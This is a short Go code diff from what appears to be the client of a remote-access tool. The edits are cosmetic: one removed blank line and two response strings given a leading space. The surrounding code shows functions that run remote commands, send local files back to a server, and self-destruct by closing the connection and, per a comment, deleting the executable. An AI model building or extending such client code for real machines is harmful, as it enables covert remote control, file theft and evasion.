@@ -39,7 +39,6 @@ func (c *Client) run(instr *Command) {
 	
 	var stdoutBuf bytes.Buffer
 	cmd.Stdout = &stdoutBuf
-
 	
 	go func() {
 		cmdResult := &Response{}
@@ -133,7 +132,7 @@ func (c *Client) entryPoint(instr *Command) {
 
 //*Closes the connection (and deletes exe) of client
 func (c *Client) selfDestruct(instr *Command) {
-	instr.Response.Data = []byte("Self Destructing....")
+	instr.Response.Data = []byte(" Self Destructing....")
 	instr.Response.Result = true
 	c.sendResponse(instr)
 	c.Conn.Close()
@@ -200,7 +199,7 @@ func (c *Client) sendToServer(instr *Command) {
 		return
 	}
 
-	retData := fmt.Sprintf("DOWNLOADINFO %d %s", fileStats.Size(), filepath.Base(instr.Action))
+	retData := fmt.Sprintf(" DOWNLOADINFO %d %s", fileStats.Size(), filepath.Base(instr.Action))
 	c.Conn.Write([]byte(retData))
 
 	if _, err = io.CopyN(c.Conn, file, fileStats.Size()); err != nil {
